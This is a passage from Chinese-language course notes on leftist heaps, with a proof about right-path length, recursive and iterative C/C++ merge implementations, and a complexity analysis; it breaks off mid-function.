<p>使用数学归纳法证明。若 <span class="arithmatex">\(r = 1\)</span>，则显然至少存在 1 个结点。设定理对右路径上有小于等于 <span class="arithmatex">\(r\)</span> 个结点的情况都成立，现在考虑在右路径上有 <span class="arithmatex">\(r + 1\)</span> 个结点的左式堆。此时，根的右子树恰好在右路径上有 <span class="arithmatex">\(r\)</span> 个结点，因此右子树大小至少为 <span class="arithmatex">\(2^r − 1\)</span>。考虑左子树，根据左式堆定义左子树的 Npl 必须大于等
于 <span class="arithmatex">\(r − 1\)</span>，事实上很容易归纳得到 Npl 大于等于 <span class="arithmatex">\(r − 1\)</span> 的树右路径至少有 <span class="arithmatex">\(r\)</span> 个结点，因此左子树大小也
至少为 <span class="arithmatex">\(2^r − 1\)</span>，因此整棵树的结点数至少为</p>
<div class="arithmatex">\[1 + (2^r − 1) + (2^r − 1) = 2^{r+1} − 1\]</div>
</div>
<h3 id="note-ads-wk3_2-_5">操作与实现<a class="headerlink" href="#note-ads-wk3_2-_5" title="Permanent link">&para;</a></h3>
<div class="admonition quote">
<p class="admonition-title">wyy有话说</p>
<p>有一个直觉是值得特别说明的，就是我们发现平衡搜索树中我们通常要求树越平衡越好，但堆却似乎不需要这一点，这是为什么呢。这是因为堆不支持 find 操作，所以左式堆左边的结点在操作中可以完全不被访问，而我们会知道只在右路径上操作也完全可以解决插入、删除最小值和合并，因此我们完全不需要保持树的平衡。</p>
</div>
<h4 id="note-ads-wk3_2-mergeinsert">Merge&amp;Insert<a class="headerlink" href="#note-ads-wk3_2-mergeinsert" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Insert：可以视为一个堆和一个单结点的堆的Merge，因此问题转化为Merge。</p>
</blockquote>
<p><strong>递归实现</strong></p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk3_2-__codelineno-0-1"></a><span class="n">PriorityQueue</span><span class="w">  </span><span class="nf">Merge</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk3_2-__codelineno-0-2"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk3_2-__codelineno-0-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">H2</span><span class="p">;</span><span class="w">  </span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk3_2-__codelineno-0-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">H1</span><span class="p">;</span><span class="w">  </span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk3_2-__codelineno-0-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">Merge1</span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk3_2-__codelineno-0-6"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">Merge1</span><span class="p">(</span><span class="w"> </span><span class="n">H2</span><span class="p">,</span><span class="w"> </span><span class="n">H1</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk3_2-__codelineno-0-7"></a><span class="p">}</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk3_2-__codelineno-0-8"></a>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk3_2-__codelineno-0-9"></a><span class="k">static</span><span class="w"> </span><span class="n">PriorityQueue</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk3_2-__codelineno-0-10"></a><span class="nf">Merge1</span><span class="p">(</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk3_2-__codelineno-0-11"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk3_2-__codelineno-0-12"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Left</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w">     </span><span class="cm">/* single node */</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk3_2-__codelineno-0-13"></a><span class="w">        </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H2</span><span class="p">;</span><span class="w">  </span><span class="cm">/* H1-&gt;Right is already NULL </span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk3_2-__codelineno-0-14"></a><span class="cm">                    and H1-&gt;Npl is already 0 */</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-ads-wk3_2-__codelineno-0-15"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-ads-wk3_2-__codelineno-0-16"></a><span class="w">        </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="p">,</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">);</span><span class="w">     </span><span class="cm">/* Step 1 &amp; 2 */</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-ads-wk3_2-__codelineno-0-17"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Left</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-ads-wk3_2-__codelineno-0-18"></a><span class="w">            </span><span class="n">SwapChildren</span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="w"> </span><span class="p">);</span><span class="w"> </span><span class="cm">/* Step 3 */</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-ads-wk3_2-__codelineno-0-19"></a><span class="w">        </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#note-ads-wk3_2-__codelineno-0-20"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="cm">/* end else */</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#note-ads-wk3_2-__codelineno-0-21"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">H1</span><span class="p">;</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#note-ads-wk3_2-__codelineno-0-22"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>这里分开两个函数写主要是为了避免重复写<code>H1</code>接到<code>H2</code>和<code>H2</code>接到<code>H1</code>的代码，这样可以进一步的模块化减少代码量。</p>
<p>其主要步骤为</p>
<ol>
<li>如果两个堆中至少有一个是空的，那么直接返回另一个即可；</li>
<li>如果两个堆都非空，我们比较两个堆的根结点 key 的大小，key 小的是 H1，key 大的是 H2；</li>
<li>如果 H1 只有一个顶点（根据左式堆的定义，只要它没有左孩子就一定是单点），直接把 H2 放在
H1 的左子树就完成任务了（很容易验证这样得到的结构符合左式堆性质，此时 Npl 也没有变化）；</li>
<li>如果 H1 不只有一个顶点，则将 H1 的右子树和 H2 合并（这是递归的体现，在 base case 设计良好，其它步骤也都合理的情况下你完全可以相信这一步递归帮你做对了），成为 H1 的新右子树；</li>
<li>如果 H1 的 Npl 性质被违反，则交换它的两个子树；</li>
<li>更新 H1 的 Npl，结束任务</li>
</ol>
</div>
<details class="key-point">
<summary>合并的写法</summary>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk3_2-__codelineno-1-1"></a><span class="n">PriorityQueue</span><span class="w"> </span><span class="nf">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk3_2-__codelineno-1-2"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk3_2-__codelineno-1-3"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">H1</span><span class="o">==</span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">H2</span><span class="p">;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk3_2-__codelineno-1-4"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">H2</span><span class="o">==</span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">H1</span><span class="p">;</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk3_2-__codelineno-1-5"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Element</span><span class="o">&gt;</span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">Element</span><span class="p">)</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk3_2-__codelineno-1-6"></a><span class="w">    </span><span class="n">swap</span><span class="p">(</span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">H2</span><span class="p">);</span><span class="w">  </span><span class="c1">//swap H1 and H2</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk3_2-__codelineno-1-7"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Left</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk3_2-__codelineno-1-8"></a><span class="w">    </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">Left</span><span class="o">=</span><span class="n">H2</span><span class="p">;</span><span class="w">                  </span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk3_2-__codelineno-1-9"></a><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk3_2-__codelineno-1-10"></a><span class="w">    </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="p">,</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk3_2-__codelineno-1-11"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Left</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ads-wk3_2-__codelineno-1-12"></a><span class="w">    </span><span class="n">SwapChildren</span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="w"> </span><span class="p">);</span><span class="w">  </span><span class="c1">//swap the left child and right child of H1</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ads-wk3_2-__codelineno-1-13"></a><span class="w">    </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="o">=</span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">Right</span><span class="o">-&gt;</span><span class="n">Npl</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ads-wk3_2-__codelineno-1-14"></a><span class="p">}</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ads-wk3_2-__codelineno-1-15"></a><span class="k">return</span><span class="w"> </span><span class="n">H1</span><span class="p">;</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ads-wk3_2-__codelineno-1-16"></a><span class="p">}</span>
</span></code></pre></div>
<p><code>swap</code>函数可以调用<code>std::swap</code>，也可以自己实现。</p>
</details>
<p><strong>递归实现的复杂度</strong></p>
<p>首先分析递归的最大深度。我们发现，在 1-5 步这样的递归过程中，产生的递归层数不会超过两个左式堆的右路径长度之和，因为每次递归都会使得两个堆的其中一个（根结点 key 更小的）向着右路径上下一个右孩子推进，并且直到其中一个推到了 null 结点就不再加深递归。注意加深一层的过程中的操作是常数的，因为只需要简单的大小比较和找孩子，加上右路径长度的限制，因此递归向下的过程是 <span class="arithmatex">\(O(\log n)\)</span> 的。这一点我们可以更严谨地展开：假设 <span class="arithmatex">\(H1\)</span> 大小为 <span class="arithmatex">\(N1\)</span>，<span class="arithmatex">\(H2\)</span> 大小为 <span class="arithmatex">\(N2\)</span>，两者路径之和</p>
<div class="arithmatex">\[O( \log N1 + \log N2) = O(\log N1N2) = O(log \sqrt{N1N2}) = O(\log(N1 + N2))\]</div>
<p>上面的推导用到了基本不等式 <span class="arithmatex">\(a + b \geqslant 2\sqrt{ab}\)</span>。总而言之，两个堆右路径长度之和仍然是两个堆大小的对数级别，因此递归层数是 <span class="arithmatex">\(O(\log n)\)</span> 的是准确的接下来分析递归返回的操作，事实上每一层的操作也是常数的，因为只需要接上新的指针，判断、交换
子树以及更新 Npl，所以也是 <span class="arithmatex">\(O(\log n)\)</span> 的，因此总的时间复杂度就是 <span class="arithmatex">\(O(\log n)\)</span> 的。</p>
<p><strong>迭代实现</strong></p>
<p>递归过程的展开实际上就等价于迭代算法的流程：每一次递归向下对应迭代中保留根结点更小的堆的左子树（就像是左子树不动，右子树等着接下来合并的结果），直到最后一次与 null合并直接接上，递归返回过程实际上就是逐个检查新的右路径上的结点是否有违反 Npl 性质的并且更新 Npl 即可，其它结点无需关心是因为它们根本就不受影响因为我们已经说明了迭代和递归的每一步都是有对应关系的，只不过递归是最后返回时才接上每个结点的右子树，迭代过程中就已经接好了，因此二者时间复杂度是一样的。当然，我们在完成上面的流程后会有一个观察，就是在递归向下之后，或者说交换孩子调整左式堆性质之前，合并得到的堆的右路径是原来两个堆的右路径合并排序的结果，通过上面的过程我们很容易证明这一结论是通用的，因为我们每次都在比较两个堆的右路径上两个点的大小，然后把小的作为根插入。有了这一规律，我们做题会更快捷一些，因为你只需要把两条右路径从小到大排序，然后从小到大依次带着左子树接入到新的右路径即可（但要注意在此之后还需要调整使得满足左式堆结构性质）。因此我们用代码实现迭代版本也并没有想象中复杂，只需要对两个堆右路径从小到大遍历操作，然后再从右路径最后一个点返回根结点，过程中检查结构性质并更新 Npl 即可</p>
<div align=center><img src="../NOTE/ADS/part1/16.png" width="50%"></div>

<div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ads-wk3_2-__codelineno-2-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">npl_update</span><span class="p">(</span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">h</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ads-wk3_2-__codelineno-2-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ads-wk3_2-__codelineno-2-3"></a><span class="w">    </span><span class="n">h</span><span class="o">-&gt;</span><span class="n">npl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="o">-&gt;</span><span class="n">npl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ads-wk3_2-__codelineno-2-4"></a><span class="p">}</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ads-wk3_2-__codelineno-2-5"></a>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ads-wk3_2-__codelineno-2-6"></a><span class="n">LeftistHeap</span><span class="w"> </span><span class="nf">merge_iterative</span><span class="p">(</span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">h2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ads-wk3_2-__codelineno-2-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">h2</span><span class="p">;</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-ads-wk3_2-__codelineno-2-8"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-ads-wk3_2-__codelineno-2-9"></a><span class="w">    </span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">stack</span><span class="p">[</span><span class="n">MAX_STACK_SIZE</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-ads-wk3_2-__codelineno-2-10"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-ads-wk3_2-__codelineno-2-11"></a><span class="w">    </span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="c1">//创建新堆</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-ads-wk3_2-__codelineno-2-12"></a><span class="w">    </span><span class="n">LeftistHeap</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">h</span><span class="p">;</span><span class="c1">//指向新堆的指针，用于更新</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-ads-wk3_2-__codelineno-2-13"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">h1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-ads-wk3_2-__codelineno-2-14"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">h2</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-ads-wk3_2-__codelineno-2-15"></a><span class="w">            </span><span class="n">swap</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">);</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-ads-wk3_2-__codelineno-2-16"></a><span class="w">        </span><span class="p">}</span><span class="c1">//保证h1的key小于h2</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#note-ads-wk3_2-__codelineno-2-17"></a><span class="w">        </span><span class="n">stack</span><span class="p">[</span><span class="o">++</span><span class="n">top</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="c1">//将h1入栈</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#note-ads-wk3_2-__codelineno-2-18"></a><span class="w">        </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="c1">//修改新堆对应位置上的值</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#note-ads-wk3_2-__codelineno-2-19"></a><span class="w">        </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">;</span><span class="c1">//指针指向下一个需要更新的位置</span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#note-ads-wk3_2-__codelineno-2-20"></a><span class="w">        </span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">;</span><span class="c1">//保留下一个h1</span>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#note-ads-wk3_2-__codelineno-2-21"></a><span class="w">        </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h2</span><span class="p">;</span><span class="c1">//将h2接到h1的右边,如果此时接得不对，会在下一次循环中*p=h1，来修改</span>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#note-ads-wk3_2-__codelineno-2-22"></a><span class="w">        </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">next</span><span class="p">;</span><span class="c1">//更新h1  </span>
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#note-ads-wk3_2-__codelineno-2-23"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#note-ads-wk3_2-__codelineno-2-24"></a><span class="w">    </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="c1">//剩余的直接接上</span>
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#note-ads-wk3_2-__codelineno-2-25"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">top</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#note-ads-wk3_2-__codelineno-2-26"></a><span class="w">        </span><span class="n">npl_update</span><span class="p">(</span><span class="n">stack</span><span class="p">[</span><span class="n">top</span><span class="o">--</span><span class="p">]);</span>
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#note-ads-wk3_2-__codelineno-2-27"></a><span class="w">    </span><span class="p">}</span><span class="c1">//更新npl</span>
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#note-ads-wk3_2-__codelineno-2-28"></a><span class="w">    </span><span class="n">adjust</span><span class="p">(</span><span class="n">h</span><span class="p">);</span><span class="c1">//调整堆</span>
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#note-ads-wk3_2-__codelineno-2-29"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">h</span><span class="p">;</span>
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#note-ads-wk3_2-__codelineno-2-30"></a><span class="p">}</span>
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#note-ads-wk3_2-__codelineno-2-31"></a>
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#note-ads-wk3_2-__codelineno-2-32"></a><span class="kt">void</span><span class="w"> </span><span class="nf">adjust</span><span class="p">(</span><span class="n">LeftistHeap</span><span class="w"> </span><span class="n">h</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#note-ads-wk3_2-__codelineno-2-33"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#note-ads-wk3_2-__codelineno-2-34"></a><span class="w">    </span><span class="n">adjust</span><span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">);</span>
